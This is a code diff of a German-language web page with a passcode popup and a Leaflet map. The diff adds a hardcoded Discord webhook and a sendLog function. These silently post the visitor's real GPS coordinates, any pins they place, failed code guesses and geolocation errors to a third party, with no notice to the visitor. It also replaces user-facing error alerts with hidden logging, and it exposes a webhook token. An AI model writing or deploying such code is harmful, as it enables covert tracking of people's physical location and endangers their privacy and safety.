@@ -2,65 +2,35 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8">
-  <title>Standort setzen</title>
+  <title>Standort setzen (mit Logging)</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" rel="stylesheet" />
   <style>
-    body {
-      margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #f2f2f7;
-    }
-
-    #map {
-      height: 100vh;
-      width: 100vw;
-      display: none;
-    }
-
+    body { margin: 0; font-family: -apple-system, sans-serif; background: #f2f2f7; }
+    #map { height: 100vh; width: 100vw; display: none; }
     .popup {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.6);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 10;
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.6); display: flex;
+      align-items: center; justify-content: center; z-index: 10;
     }
-
     .popup-content {
-      background: white;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      text-align: center;
-      max-width: 300px;
+      background: white; padding: 30px; border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; max-width: 300px;
     }
-
     .popup-content input {
-      padding: 10px;
-      width: 100%;
-      border-radius: 10px;
-      border: 1px solid #ccc;
-      margin-top: 10px;
-      font-size: 16px;
+      padding: 10px; width: 100%; border-radius: 10px;
+      border: 1px solid #ccc; margin-top: 10px; font-size: 16px;
     }
-
     .popup-content button {
-      margin-top: 15px;
-      padding: 10px 20px;
-      border: none;
-      background: #007aff;
-      color: white;
-      font-size: 16px;
-      border-radius: 12px;
-      cursor: pointer;
+      margin-top: 15px; padding: 10px 20px; border: none;
+      background: #007aff; color: white; font-size: 16px;
+      border-radius: 12px; cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-<!-- Codeeingabe -->
+<!-- Popup für Code -->
 <div class="popup" id="popup">
   <div class="popup-content">
     <h2>Location Locked</h2>
@@ -72,9 +42,19 @@
 <!-- Karte -->
 <div id="map"></div>
 
-<!-- Leaflet -->
+<!-- Leaflet + JS -->
 <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
 <script>
+  const webhookUrl = "https://discord.com/api/webhooks/1340763818195812384/4MkBGKZpLKa7CgBAv-MHkJsRjFaM-tPlPE31x7uUC-_f4EMOfqgnHupLELASCwChUPZo";
+
+  function sendLog(message) {
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: message })
+    });
+  }
+
   let map;
   let marker;
 
@@ -89,6 +69,7 @@
     if (code === "1234") {
       document.getElementById("popup").style.display = "none";
       document.getElementById("map").style.display = "block";
+      sendLog("✅ Code erfolgreich eingegeben: 1234");
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
@@ -96,27 +77,28 @@
           const lon = position.coords.longitude;
 
           map = L.map('map').setView([lat, lon], 15);
-
           L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             attribution: '&copy; OpenStreetMap contributors'
           }).addTo(map);
 
           L.marker([lat, lon], { icon: customIcon }).addTo(map);
+          sendLog(`📍 Echte Location geladen: ${lat}, ${lon}`);
 
-          // Klick-Nadel setzen
           map.on('click', function(e) {
             if (marker) map.removeLayer(marker);
             marker = L.marker(e.latlng, { icon: customIcon }).addTo(map);
+            sendLog(`📌 Neue Fake-Location gesetzt bei: ${e.latlng.lat}, ${e.latlng.lng}`);
           });
 
         }, function(error) {
-          alert("Standortzugriff nicht erlaubt oder fehlgeschlagen.");
+          sendLog("❌ Standortzugriff abgelehnt oder fehlgeschlagen.");
         });
       } else {
-        alert("Geolocation wird nicht unterstützt.");
+        sendLog("❌ Geolocation nicht unterstützt.");
       }
     } else {
       alert("Falscher Code.");
+      sendLog("⚠️ Falscher Codeversuch: " + code);
     }
   }
 </script>
